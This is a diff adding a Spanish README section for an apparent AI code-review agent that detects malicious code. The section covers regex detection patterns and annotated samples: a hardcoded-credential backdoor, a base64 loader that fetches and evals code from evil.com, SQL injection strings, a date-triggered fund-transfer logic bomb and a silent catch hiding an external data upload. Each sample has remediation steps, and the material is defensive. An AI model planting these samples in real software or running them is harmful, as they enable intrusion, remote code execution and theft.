@@ -249,6 +249,129 @@ GET  /monitoring/costs           Costos por modelo IA
 
 ---
 
+## Detección de funcionalidades maliciosas
+
+El **Agente Inspector** analiza el código con Claude para identificar patrones de riesgo en tres capas:
+
+### 1. Pre-filtrado por patrones de regex
+
+Antes de enviar código a la IA, el sistema aplica regex para priorizar archivos sospechosos:
+
+| Categoría | Patrones buscados |
+|-----------|------------------|
+| **Puertas traseras** | `hardcoded.*bypass`, `credential.*check.*===.*false`, `if.*eval` |
+| **Inyección** | `sql.*concat`, `query.*\+`, `eval`, `innerHTML.*=`, `exec\(.*process\.env` |
+| **Ofuscación** | `atob\(`, `btoa\(`, `String\.fromCharCode`, `_0x[0-9a-f]{4}` (vars hex) |
+| **Errores silenciados** | `try.*catch.*\{\}`, `catch.*\{\}`, `ignore.*error` |
+
+### 2. Análisis semántico con IA
+
+Claude evalúa el **contexto completo** de cada función, no solo el texto. Esto permite detectar:
+
+- Lógica condicional sospechosa que no activa alarmas con regex simple
+- Backdoors disfrazados como código legítimo
+- Bombas lógicas activadas por fecha, usuario o condición de entorno
+
+### 3. Clasificación de hallazgos
+
+Cada hallazgo incluye:
+
+| Campo | Descripción |
+|-------|-------------|
+| `tipo_riesgo` | `PUERTA_TRASERA`, `INYECCION`, `BOMBA_LOGICA`, `OFUSCACION`, `SOSPECHOSO` |
+| `severidad` | `BAJO`, `MEDIO`, `ALTO`, `CRÍTICO` |
+| `confianza` | Score 0–1 de certeza del hallazgo |
+| `por_que_sospechoso` | Explicación técnica del riesgo |
+| `pasos_remediacion` | Lista de acciones correctivas |
+
+---
+
+### Ejemplos reales de detección
+
+#### Puerta trasera por bypass de autenticación (`CRÍTICO`)
+
+```javascript
+// ❌ DETECTADO: bypass hardcodeado en función de login
+async function autenticarUsuario(user, pwd) {
+  if (user === 'admin' && pwd === 'sup3r_s3cr3t_2024') {
+    return { autenticado: true, rol: 'superadmin' }; // salta toda validación
+  }
+  return await db.validarCredenciales(user, pwd);
+}
+```
+
+**Por qué es sospechoso:** Existe una credencial hardcodeada que otorga acceso con rol elevado sin pasar por la base de datos. Un atacante con este conocimiento puede comprometer cualquier instancia.
+
+**Remediación:** Eliminar la rama condicional, nunca almacenar credenciales en código fuente, usar variables de entorno solo para configuración no secreta.
+
+---
+
+#### Ofuscación de payload (`ALTO`)
+
+```javascript
+// ❌ DETECTADO: código decodificado en tiempo de ejecución
+const _0x4f2a = atob('ZXZhbChmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLmpzJykp');
+eval(_0x4f2a); // ejecuta: eval(fetch('https://evil.com/payload.js'))
+```
+
+**Por qué es sospechoso:** El código Base64 oculta una llamada `eval(fetch(...))` que descarga y ejecuta código externo arbitrario en tiempo de ejecución. Patrón típico de supply chain attacks.
+
+**Remediación:** Eliminar todo uso de `eval` con contenido dinámico. Auditar el historial Git para determinar cuándo fue introducido y por quién.
+
+---
+
+#### Inyección SQL por concatenación (`ALTO`)
+
+```python
+# ❌ DETECTADO: query construida con input del usuario sin sanitizar
+def buscar_usuario(nombre):
+    query = "SELECT * FROM users WHERE nombre = '" + nombre + "'"
+    return db.execute(query)
+```
+
+**Por qué es sospechoso:** El input del usuario se concatena directamente en la query SQL. Un atacante puede inyectar `' OR '1'='1` para extraer todos los registros, o `'; DROP TABLE users; --` para destruir datos.
+
+**Remediación:** Usar consultas parametrizadas (`db.execute("... WHERE nombre = ?", [nombre])`).
+
+---
+
+#### Bomba lógica activada por fecha (`MEDIO`)
+
+```javascript
+// ❌ DETECTADO: código que se activa en fecha específica
+function procesarPago(monto) {
+  const hoy = new Date();
+  if (hoy.getFullYear() === 2025 && hoy.getMonth() === 11) {
+    transferirFondos('cuenta_externa_123', monto); // se activa en diciembre 2025
+  }
+  return realizarPagoNormal(monto);
+}
+```
+
+**Por qué es sospechoso:** La función de pago contiene una rama condicional oculta que transfiere fondos a una cuenta externa durante un mes específico. Clásico patrón de bomba lógica temporizada.
+
+**Remediación:** Eliminar la rama condicional, revisar todos los commits que tocaron esta función, investigar la cuenta `cuenta_externa_123`.
+
+---
+
+#### Error silenciado que oculta actividad maliciosa (`BAJO`)
+
+```typescript
+// ❌ DETECTADO: catch vacío que podría enmascarar errores de exfiltración
+async function sincronizarDatos(payload: any) {
+  try {
+    await enviarAServidor('https://data-collector.io/ingest', payload);
+  } catch {} // silencia fallos de red — no hay logging
+  await guardarLocalmente(payload);
+}
+```
+
+**Por qué es sospechoso:** El bloque `catch {}` vacío oculta errores de una llamada de red a dominio externo. Si el servidor no responde, la aplicación continúa sin ningún registro del intento.
+
+**Remediación:** Agregar logging en el catch, justificar el propósito del endpoint externo, o eliminar la llamada si no es necesaria.
+
+---
+
 ## Pipeline de análisis
 
 ```
